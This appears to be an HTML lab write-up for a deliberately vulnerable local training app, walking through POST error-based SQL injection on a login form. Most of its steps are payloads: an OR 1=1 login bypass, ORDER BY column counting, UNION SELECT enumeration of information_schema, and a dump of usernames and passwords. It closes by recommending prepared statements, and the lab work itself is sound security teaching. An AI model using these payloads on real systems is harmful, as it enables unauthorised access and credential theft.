@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Lab – Lesson 5 (POST Error-Based)</title>
+
+  <style>
+    :root {
+      --bg: #0d0f17;
+      --surface: #13151c;
+      --text: #a0a8b8;
+      --accent: #7aa2f7;
+      --border: #24283b;
+      --cyan: #7dcfff;
+      --green: #9ece6a;
+      --yellow: #e0af68;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Cascadia Code", "Fira Mono", Consolas, monospace;
+      background: var(--bg);
+      color: var(--text);
+      font-size: 14px;
+      line-height: 1.55;
+      min-height: 100vh;
+    }
+
+    .bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 4px 12px;
+      display: flex;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .bar span { color: var(--accent); }
+
+    .wrap {
+      max-width: 960px;
+      margin: auto;
+      padding: 2rem 1rem;
+    }
+
+    .prompt { color: var(--green); }
+    .cmd    { color: var(--yellow); }
+
+    img {
+      max-width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+
+    h1, h2, h3 {
+      color: var(--accent);
+      margin-top: 1.5rem;
+      margin-bottom: .5rem;
+    }
+    h1 { font-size: 1.4rem; }
+    h2 { font-size: 1.2rem; }
+    h3 { font-size: 1.05rem; }
+
+    code {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 2px 4px;
+      border-radius: 3px;
+      color: var(--yellow);
+      font-size: 13px;
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .75rem 1rem;
+      overflow-x: auto;
+      margin: .5rem 0;
+    }
+
+    ul {
+      margin-left: 1.2rem;
+      margin-top: .5rem;
+    }
+    li { margin-bottom: .25rem; }
+
+    .tags {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .5rem .75rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      margin: 1rem 0;
+    }
+    .tag {
+      background: var(--accent);
+      color: var(--bg);
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      color: var(--cyan);
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span>user@lab</span>
+    <span>~/sqli-lesson-05</span>
+  </div>
+
+  <main class="wrap">
+    <h1>SQL Injection Lab – Lesson 5 (POST parameter injection - error based)</h1>
+
+    <div class="tags">
+      <span class="tag">SQL Injection</span>
+      <span class="tag">POST Error-Based</span>
+      <span class="tag">Web Security</span>
+      <span class="tag">Labs</span>
+    </div>
+
+    <h2>POST parameter injection - error based</h2>
+    <p>POST-parameter error-based injection is when malicious input in an HTTP POST field deliberately triggers a database/application error that leaks internal info (SQL fragments, column/table names, DB type/version) in responses or logs.</p>
+
+    <h2>Inject parameter</h2>
+    <p>Test lab: <strong class="cmd">http://localhost:8080/sqli-labs/sqli-labs-master/Less-12/</strong></p>
+    <p>Login page with <strong>Username</strong> and <strong>Password</strong> fields.</p>
+
+    <h2>Testing queries</h2>
+
+    <h3>1. Simple login (admin / admin)</h3>
+    <img src="../../../../assets/images/sqli-05/ss1.jpg" alt="ss1">
+    <p>Boom — logged in as <strong>admin</strong>.</p>
+
+    <h3>2. Break the query</h3>
+    <p>Try <code>'</code> → bypasses; try <code>"</code> → error shown.</p>
+    <img src="../../../../assets/images/sqli-05/ss2.jpg" alt="ss2">
+    <img src="../../../../assets/images/sqli-05/ss3.jpg" alt="ss3">
+
+    <h3>3. Fix & confirm injection</h3>
+    <p>Payload: <code>") #</code></p>
+    <img src="../../../../assets/images/sqli-05/ss4.jpg" alt="ss4">
+    <p>Query fixed → injection point confirmed.</p>
+
+    <h3>4. Boolean check</h3>
+    <p>Payload: <code>") OR 1=1 #</code></p>
+    <img src="../../../../assets/images/sqli-05/ss5.jpg" alt="ss5">
+    <p>Logged in as <strong>Dumb / Dumb</strong> → injectable.</p>
+
+    <h3>5. Column count with ORDER BY</h3>
+    <pre><code>") ORDER BY 1 #   → ok
+") ORDER BY 2 #   → ok
+") ORDER BY 3 #   → error</code></pre>
+    <img src="../../../../assets/images/sqli-05/ss6.jpg" alt="ss6">
+    <img src="../../../../assets/images/sqli-05/ss7.jpg" alt="ss7">
+    <img src="../../../../assets/images/sqli-05/ss8.jpg" alt="ss8">
+    <p>Only <strong>2 columns</strong>.</p>
+
+    <h3>6. Union reflection</h3>
+    <p>Payload: <code>") UNION SELECT 1,2 #</code></p>
+    <img src="../../../../assets/images/sqli-05/ss9.jpg" alt="ss9">
+    <p>Columns reflected on page.</p>
+
+    <h3>7. Database & version</h3>
+    <p>Payload: <code>") UNION SELECT version(),database() #</code></p>
+    <img src="../../../../assets/images/sqli-05/ss10.jpg" alt="ss10">
+    <p>MySQL version + DB name leaked.</p>
+
+    <h3>8. Table enumeration (LIMIT)</h3>
+    <pre><code>") UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1 #
+") UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 1,1 #
+") UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 2,1 #
+") UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 3,1 #</code></pre>
+    <img src="../../../../assets/images/sqli-05/ss11.jpg" alt="ss11">
+    <img src="../../../../assets/images/sqli-05/ss12.jpg" alt="ss12">
+    <img src="../../../../assets/images/sqli-05/ss13.jpg" alt="ss13">
+    <img src="../../../../assets/images/sqli-05/ss14.jpg" alt="ss14">
+    <img src="../../../../assets/images/sqli-05/ss15.jpg" alt="ss15">
+    <p>Tables: <em>emails, referers, uagents, users</em>.</p>
+
+    <h3>9. One-shot dumps</h3>
+    <ol>
+      <li><strong>Full schema + columns:</strong><br>
+        <code>") UNION SELECT 1,(SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()) #</code><br>
+        <img src="../../../../assets/images/sqli-05/dios1.jpg" alt="dios1">
+      </li>
+      <li><strong>Table names only:</strong><br>
+        <code>") UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) #</code><br>
+        <img src="../../../../assets/images/sqli-05/dios2.jpg" alt="dios2">
+      </li>
+      <li><strong>Users table data:</strong><br>
+        <code>") UNION SELECT 1,(SELECT GROUP_CONCAT(username,':',password) FROM users) #</code><br>
+        <img src="../../../../assets/images/sqli-05/dios3.jpg" alt="dios3">
+      </li>
+      <li><strong>Complete DB info:</strong><br>
+        <code>") UNION SELECT 1,CONCAT('DB:',database(),' | User:',user(),' | Tables:',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())) #</code><br>
+        <img src="../../../../assets/images/sqli-05/dios4.jpg" alt="dios4">
+      </li>
+    </ol>
+
+    <h2>Final Reminder</h2>
+    <p class="cmd">✅ Use prepared statements / parameterised queries to kill this bug completely.</p>
+  </main>
+
+  <footer>
+    <span>EOF ── happy hacking :)</span>
+  </footer>
+</body>
+</html>
